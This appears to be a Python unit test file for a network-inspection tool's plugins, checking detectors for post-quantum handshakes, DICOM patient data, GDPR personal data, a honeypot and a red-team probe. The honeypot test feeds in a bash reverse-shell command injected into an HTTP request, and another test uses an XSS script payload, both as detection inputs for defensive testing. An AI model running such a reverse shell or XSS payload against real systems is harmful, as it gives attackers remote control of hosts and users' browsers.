import os
import sys
import unittest

# Ensure src is in path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../")))

from src.argus_plugins.manager import PluginManager


class TestArgusPlugins(unittest.TestCase):
    def setUp(self):
        self.mgr = PluginManager(plugin_dir="d:/Argus_AI/src/argus_plugins")
        self.mgr.discover_and_load()

    def test_pqc_scout(self):
        print("\n[TEST] Testing PQC Scout...")
        # Simulate a packet containing Kyber key exchange
        payload = b"Start_TLS_Handshake_..._kyber_key_exchange_..."
        results = self.mgr.run_on_payload(payload)
        
        self.assertIn("PQCScout", results)
        self.assertEqual(results["PQCScout"]["alert"], "PQC_DETECTED")
        print(f"[PASS] PQC Scout correctly flagged: {results['PQCScout']}")

    def test_dicom_inspector(self):
        print("\n[TEST] Testing DICOM Inspector...")
        # Simulate a DICOM header
        payload = b"\x00"*128 + b"DICM" + b"SomeBinaryData" + b"PatientName" + b"John Doe"
        results = self.mgr.run_on_payload(payload)
        
        self.assertIn("DICOMInspector", results)
        self.assertEqual(results["DICOMInspector"]["alert"], "PHI_LEAK")
        print(f"[PASS] DICOM Inspector correctly flagged PHI: {results['DICOMInspector']}")

    def test_ghost_service(self):
        print("\n[TEST] Testing Ghost Service (Honeypot)...")
        # Simulate an attacker trying to run shell commands
        payload = b"GET / HTTP/1.1\r\nHost: 10.0.0.1\r\n\r\n; /bin/bash -i >& /dev/tcp/1.2.3.4/8080"
        results = self.mgr.run_on_payload(payload)
        
        self.assertIn("GhostService", results)
        self.assertEqual(results["GhostService"]["alert"], "HONEYPOT_TRIGGER")
        print(f"[PASS] Ghost Service trapped command injection: {results['GhostService']}")

    def test_gdpr_auditor(self):
        print("\n[TEST] Testing GDPR Auditor...")
        # Simulate PII leak
        payload = b"POST /api/user HTTP/1.1\r\n\r\nemail=victim@example.com&phone=9876543210"
        results = self.mgr.run_on_payload(payload)
        
        self.assertIn("GDPRLogAuditor", results)
        self.assertEqual(results["GDPRLogAuditor"]["alert"], "GDPR_PII_LEAK")
        print(f"[PASS] GDPR Auditor caught PII: {results['GDPRLogAuditor']}")

    def test_auto_pentest(self):
        print("\n[TEST] Testing Auto-Pentest (Red Team)...")
        # Trigger the drill payload from the plugin itself (or manually craft it)
        # Note: In a real test, we'd instantiate the specific class,
        # but here we scan generic content
        payload = b"GET /?q=<script>alert('RedTeam-XSS-Probe')</script> HTTP/1.1"
        results = self.mgr.run_on_payload(payload)
        
        # It should detect its own signature
        self.assertIn("AutoPentest", results)
        print(f"[PASS] Red Team drill detected: {results['AutoPentest']}")

if __name__ == "__main__":
    unittest.main()
